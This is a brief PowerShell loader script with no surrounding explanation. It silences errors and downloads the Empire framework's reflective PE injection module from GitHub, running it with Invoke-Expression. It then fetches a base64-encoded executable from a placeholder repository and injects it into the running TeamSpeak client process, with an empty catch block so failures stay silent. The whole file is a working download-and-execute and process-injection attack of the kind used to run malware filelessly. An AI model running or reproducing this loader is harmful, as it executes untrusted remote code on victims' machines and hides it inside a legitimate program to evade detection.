$ErrorActionPreference = 'SilentlyContinue'

Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    
    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
    Invoke-Expression $loaderContent

    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
    $base64String = (iwr -UseBasicParsing $exeUrl).Content
    
    $peBytes = [System.Convert]::FromBase64String($base64String)

    $target = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
} catch {

}
